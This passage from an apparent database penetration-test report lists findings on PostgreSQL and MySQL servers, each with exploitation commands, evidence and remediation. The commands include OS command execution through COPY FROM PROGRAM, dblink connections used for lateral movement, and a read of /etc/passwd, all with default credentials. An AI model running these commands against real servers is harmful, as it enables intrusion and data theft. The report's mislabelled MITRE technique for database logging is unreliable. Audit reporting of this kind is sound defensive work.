The dblink extension was successfully created by the superuser and a connection was established (returned 'OK'). This demonstrates the PostgreSQL server can initiate outbound connections, making it a powerful SSRF and lateral movement primitive. The postgres_fdw extension (Foreign Data Wrapper) is also available, which allows querying remote PostgreSQL servers as if they were local tables. The file_fdw extension allows treating server-side files as foreign tables. Together, these three extensions provide comprehensive lateral movement, file access, and network pivoting capabilities from the database server.

**Exploitation Commands**

```
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host=127.0.0.1 port=5432 dbname=postgres user=postgres password=postgres sslmode=disable');"
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "SELECT name FROM pg_available_extensions WHERE name IN ('dblink','postgres_fdw','file_fdw');"
```

**Evidence / Logs**

```
CREATE EXTENSION dblink: SUCCESS
dblink_connect result: OK
Available lateral movement extensions: dblink, postgres_fdw, file_fdw
```

**Remediation**

1. Do not grant CREATE EXTENSION privileges to application roles. 2. Drop unused extensions: DROP EXTENSION dblink. 3. Restrict outbound network connections from the database server using firewall rules. 4. If dblink is needed, limit it to specific trusted hosts using a connection whitelist. 5. Monitor for dblink/FDW usage in audit logs.

---

### 17. [MEDIUM / confirmed] PostgreSQL SSL/TLS Disabled — All Connections Unencrypted

- **CVSS:** CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
- **MITRE ATT&CK:** T1040 Network Sniffing
- **ISO 27001:** A.10.1.1
- **Component:** PostgreSQL SSL Configuration

**Description**

SSL/TLS is disabled on the PostgreSQL server (ssl=off). All database connections, including those carrying credentials and sensitive query data, are transmitted in plaintext. An attacker with network access (e.g., via ARP spoofing or a compromised network switch) could intercept credentials, query results, and sensitive application data.

**Technical Analysis**

PostgreSQL configuration confirms SSL is disabled (ssl=off). While ssl_cert_file and ssl_key_file paths are configured, SSL is not enabled. This was also confirmed by attempting a connection with PGSSLMODE=require which failed with 'server does not support SSL'. All client-server communication occurs in plaintext, including SCRAM-SHA-256 authentication exchanges, SQL queries, and result sets containing sensitive data. The listen_addresses='*' setting means the server is exposed on all network interfaces.

**Exploitation Commands**

```
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "SELECT name, setting FROM pg_settings WHERE name IN ('ssl','ssl_cert_file','ssl_key_file');"
psql -c "SELECT pg_read_file('/etc/passwd');" with PGSSLMODE=require failed: 'server does not support SSL, but SSL was required'
```

**Evidence / Logs**

```
ssl|off
ssl_cert_file|server.crt
ssl_key_file|server.key
PGSSLMODE=require connection error: server does not support SSL, but SSL was required
```

**Remediation**

1. Enable SSL by setting ssl=on in postgresql.conf. 2. Generate or deploy proper TLS certificates. 3. Consider using hostssl entries in pg_hba.conf to require SSL for remote connections. 4. Restart PostgreSQL after configuration changes.

---

### 18. [MEDIUM / confirmed] MySQL SSL/TLS Disabled — All Connections Unencrypted

- **CVSS:** CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
- **MITRE ATT&CK:** T1040 Network Sniffing
- **ISO 27001:** A.10.1.1
- **Component:** MySQL SSL Configuration

**Description**

SSL/TLS is fully disabled on the MySQL 5.6.51 server (have_ssl=DISABLED). No SSL certificates are configured (ssl_ca, ssl_cert, ssl_key are all empty). All database connections carry credentials and sensitive data in plaintext, vulnerable to network-level interception.

**Technical Analysis**

MySQL reports have_ssl=DISABLED and all SSL-related variables (ssl_ca, ssl_cert, ssl_key, etc.) are empty. This means SSL/TLS support is not compiled in or not configured at all. All client connections, including authentication exchanges using mysql_native_password (SHA1-based), transmit credentials and query data without encryption. Given that the root@% account accepts connections from any host, this significantly increases the risk of credential interception on the network.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -P 3306 -u root -prootwolf -e "SHOW VARIABLES LIKE 'have_ssl'; SHOW VARIABLES LIKE 'ssl%';"
```

**Evidence / Logs**

```
have_ssl=DISABLED
ssl_ca=
ssl_capath=
ssl_cert=
ssl_cipher=
ssl_crl=
ssl_crlpath=
ssl_key=
```

**Remediation**

1. Upgrade to MySQL 5.7+ or 8.0+ which has built-in SSL support and auto-generates certificates. 2. Configure SSL certificates and enable have_ssl. 3. Use REQUIRE SSL on user accounts to enforce encrypted connections. 4. MySQL 5.6 is EOL — upgrade immediately for security updates.

---

### 19. [MEDIUM / confirmed] PostgreSQL Connection and Statement Logging Disabled

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
- **MITRE ATT&CK:** T1562.002 Impair Defenses: Disable Windows Event Logging
- **ISO 27001:** A.12.4.1
- **Component:** PostgreSQL Logging Configuration

**Description**

PostgreSQL logging is almost entirely disabled: log_connections=off, log_disconnections=off, log_statement=none. This means no audit trail exists for connection attempts, disconnections, or SQL statements executed. An attacker could connect, exfiltrate data, or execute commands via COPY PROGRAM without leaving any evidence in the database logs.

**Technical Analysis**

All three key audit logging settings are disabled. log_connections=off means successful/failed connection attempts are not recorded. log_disconnections=off means session duration and disconnect reasons are not tracked. log_statement=none means no SQL queries are logged, including potentially malicious COPY PROGRAM commands or data exfiltration queries. This configuration makes incident response and forensic analysis nearly impossible.

**Exploitation Commands**

```
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "SELECT name, setting FROM pg_settings WHERE name IN ('log_connections','log_disconnections','log_statement');"
```

**Evidence / Logs**

```
log_connections|off
log_disconnections|off
log_statement|none
```

**Remediation**

1. Enable log_connections=on to track all connection attempts. 2. Enable log_disconnections=on to track session durations. 3. Set log_statement to at least 'ddl' or preferably 'all' for full audit. 4. Enable log_duration=on to track slow queries. 5. Consider pgaudit extension for granular audit logging. 6. Ship logs to a centralized SIEM.

---

### 20. [MEDIUM / confirmed] MySQL local_infile Enabled — Client-Side File Read Risk

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N
- **MITRE ATT&CK:** T1005 Data from Local System
- **ISO 27001:** A.12.6.1
- **Component:** MySQL local_infile

**Description**

The MySQL server has local_infile=ON, which allows LOAD DATA LOCAL INFILE statements. This can be exploited by a rogue MySQL server to read arbitrary files from client machines when they connect. It also enables authorized users to load data from their client's filesystem into database tables, which could be used for data injection or exfiltration in certain attack scenarios.

**Technical Analysis**

The local_infile variable is set to ON, enabling LOAD DATA LOCAL INFILE functionality. While the MySQL client must also support this option, when enabled it allows reading files from the client machine's filesystem. This creates a risk in rogue MySQL server scenarios where a malicious server instructs connecting clients to send files. Additionally, it could be used by authorized users to exfiltrate data from application servers that connect to this database.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -u root -prootwolf -e "SHOW VARIABLES LIKE 'local_infile';"
```

**Evidence / Logs**

```
local_infile=ON
```

**Remediation**

1. Disable local_infile by setting local_infile=OFF in my.cnf. 2. Use --local-infile=0 on MySQL client connections. 3. If LOAD DATA is needed, use the non-LOCAL variant with server-side files.

---

### 21. [MEDIUM / confirmed] MySQL Audit and Query Logging Completely Disabled

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
- **MITRE ATT&CK:** T1562.002 Impair Defenses: Disable Windows Event Logging
- **ISO 27001:** A.12.4.1
- **Component:** MySQL Logging Configuration

**Description**

MySQL has general_log=OFF, slow_query_log=OFF, log_bin=OFF, and no audit plugin installed. No query logging, binary logging, or audit logging is active. An attacker could execute arbitrary queries, extract data, and modify the database without leaving any trace in the database logs. Binary logging is also disabled, meaning point-in-time recovery is impossible.

**Technical Analysis**

All forms of MySQL logging are disabled. The general_log records all SQL queries — disabled. The slow_query_log records long-running queries — disabled. Binary logging (log_bin) is disabled, meaning there is no transaction log for point-in-time recovery or replication. No audit plugin (e.g., audit_log or McAfee audit) is installed. This configuration makes forensic investigation of database breaches impossible and prevents any form of change tracking or accountability.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -u root -prootwolf -e "SHOW VARIABLES LIKE 'general_log'; SHOW VARIABLES LIKE 'slow_query_log'; SHOW VARIABLES LIKE 'log_bin'; SHOW VARIABLES LIKE 'audit%';"
```

**Evidence / Logs**

```
general_log=OFF
slow_query_log=OFF
log_bin=OFF
audit variables: (none found)
```

**Remediation**

1. Enable general_log=ON and set general_log_file to a monitored path. 2. Enable slow_query_log=ON with an appropriate long_query_time. 3. Enable binary logging (log_bin=ON) for audit trail and point-in-time recovery capability. 4. Install and configure MySQL Enterprise Audit or a compatible audit plugin. 5. Ship logs to a centralized SIEM.

---

### 22. [MEDIUM / exploited] PostgreSQL Server Environment Variables Exposed via COPY PROGRAM

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- **MITRE ATT&CK:** T1082 System Information Discovery
- **ISO 27001:** A.12.6.1
- **Component:** PostgreSQL COPY PROGRAM

**Description**

Using COPY FROM PROGRAM 'env', the full server-side environment was extracted including: HOSTNAME=docker-desktop, PGDATA=/var/lib/postgresql/data, PG_VERSION=16.14-1.pgdg13+1, GOSU_VERSION=1.19, HOME=/var/lib/postgresql, and full PATH. Network routing information was also extracted via /proc/net/fib_trie revealing the container's network topology. This information aids further exploitation and lateral movement.

**Technical Analysis**

The COPY FROM PROGRAM primitive was used to execute 'env' and 'cat /proc/net/fib_trie' on the database server. This revealed the complete server environment including the PostgreSQL data directory, version details, and the hostname confirming this is a Docker container (docker-desktop). The network routing table exposed the container's network topology including multiple subnets. This information is valuable for an attacker planning lateral movement, file system exploration (knowing exact paths), and understanding the deployment architecture.

**Exploitation Commands**

```
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "CREATE TEMP TABLE env_info (line text); COPY env_info FROM PROGRAM 'env'; SELECT * FROM env_info;"
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "CREATE TEMP TABLE net_info (line text); COPY net_info FROM PROGRAM 'cat /proc/net/fib_trie'; SELECT * FROM net_info LIMIT 20;"
```

**Evidence / Logs**

```
HOSTNAME=docker-desktop
PGDATA=/var/lib/postgresql/data
PG_VERSION=16.14-1.pgdg13+1
GOSU_VERSION=1.19
HOME=/var/lib/postgresql
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/postgresql/16/bin
Network: Multiple subnets visible via /proc/net/fib_trie
```

**Remediation**

1. Remove superuser and pg_execute_server_program privileges from application roles. 2. Minimize environment variables available to the PostgreSQL process. 3. Use a hardened container image with minimal tools installed. 4. Implement read-only filesystem for the container where possible.

---
